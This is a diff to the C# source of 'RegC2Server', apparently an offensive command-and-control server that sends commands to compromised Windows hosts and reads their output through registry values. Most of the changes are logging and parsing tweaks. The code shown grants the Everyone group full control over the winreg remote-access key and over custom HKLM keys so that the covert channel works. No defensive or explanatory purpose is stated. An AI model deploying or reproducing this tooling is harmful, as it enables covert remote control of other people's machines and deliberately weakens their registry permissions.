@@ -11,7 +11,7 @@ namespace RegC2Server
 
         static void RunCmd(string registrykey, string cmd)
         {
-            string newcmd = cmd.Split(' ')[1];
+            string newcmd = cmd.Substring(cmd.IndexOf(" ")).Remove(0,1);
 
             RegistryKey myReg;
             try
@@ -24,7 +24,7 @@ namespace RegC2Server
                 Console.WriteLine(ex.Message);
                 return;
             }
-            Console.WriteLine("CMd updated to: {0}", myReg.GetValue("cmd"));
+            Console.WriteLine("Cmd updated to: {0}", myReg.GetValue("cmd"));
 
             //Read output when available
             myReg.SetValue("output", "");
@@ -36,7 +36,6 @@ namespace RegC2Server
                     Console.WriteLine(myReg.GetValue("output"));
                     break;
                 }
-
             }
             myReg.Close();
         }
@@ -106,8 +105,10 @@ namespace RegC2Server
                 }
                 Console.WriteLine("[+] Registry keys created... Setting up permissions");
                 ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + registrykey, true);
+            } else
+            {
+                Console.WriteLine("[+] Key already exists.. Continuing...");
             }
-            Console.WriteLine("[+] Key already exists.. Continuing...");
         }
 
         // Set WinReg permissions
@@ -115,10 +116,10 @@ namespace RegC2Server
 
         static void ChangeRegistryPermissions(string registrykey, bool allow)
         {
-            //RegistryKey myReg = Registry.LocalMachine.OpenSubKey(registrykey, true);
+
             RegistryKey myReg = Registry.LocalMachine.OpenSubKey(registrykey, RegistryKeyPermissionCheck.ReadWriteSubTree);
 
-           SecurityIdentifier si = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
+            SecurityIdentifier si = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
 
             RegistrySecurity rs = myReg.GetAccessControl();
 
@@ -126,7 +127,7 @@ namespace RegC2Server
             {
                 try
                 {
-                    Console.WriteLine("Applying rule to: " + myReg.Name);
+                    Console.WriteLine("[*] Applying rule to: " + myReg.Name);
                     rs.AddAccessRule(new RegistryAccessRule(si,
                     RegistryRights.WriteKey
                     | RegistryRights.ReadKey
@@ -134,18 +135,6 @@ namespace RegC2Server
                     | RegistryRights.FullControl,
                     AccessControlType.Allow));
                     myReg.SetAccessControl(rs);
-
-                    rs = myReg.GetAccessControl();
-                    foreach (RegistryAccessRule ar in rs.GetAccessRules(true, true, typeof(NTAccount)))
-                    {
-                        Console.WriteLine("        User: {0}", ar.IdentityReference);
-                        Console.WriteLine("        Type: {0}", ar.AccessControlType);
-                        Console.WriteLine("      Rights: {0}", ar.RegistryRights);
-                        Console.WriteLine(" Inheritance: {0}", ar.InheritanceFlags);
-                        Console.WriteLine(" Propagation: {0}", ar.PropagationFlags);
-                        Console.WriteLine("   Inherited? {0}", ar.IsInherited);
-                        Console.WriteLine();
-                    }
                     myReg.Close();
 
                 } catch (Exception ex)
@@ -156,7 +145,7 @@ namespace RegC2Server
             {
                 try
                 {
-                    Console.WriteLine("Removing rule for:" + myReg.Name);
+                    Console.WriteLine("[*] Removing rule for:" + myReg.Name);
                     rs.RemoveAccessRule(new RegistryAccessRule(si,
                     RegistryRights.WriteKey
                     | RegistryRights.ReadKey
@@ -171,7 +160,7 @@ namespace RegC2Server
                 {
                     Console.WriteLine(ex.Message);
                 }
-                }
+            }
         }
 
         static void Main(string[] args)
@@ -179,13 +168,14 @@ namespace RegC2Server
             if (args.Length != 1)
             {
                 Console.WriteLine("RegC2Server.exe <Unique Registry key name to use>\n" +
-                                  "RegC2Server.exe ws01");
+                                  "RegC2Server.exe dc01");
                 return;
             }
 
             //Catching Ctrl + C events to clean up correctly
             Console.CancelKeyPress += delegate
             {
+                Console.WriteLine("[+] Closing down...");
                 ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
                 ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + args[0], false);
                 //Environment.Exit(0);
@@ -220,6 +210,7 @@ namespace RegC2Server
                 }
 
                 if (cmd.StartsWith("exit", StringComparison.OrdinalIgnoreCase)) {
+                    Console.WriteLine("[+] Closing down...");
                     ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
                     ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\"+args[0], false);
                     Environment.Exit(0);
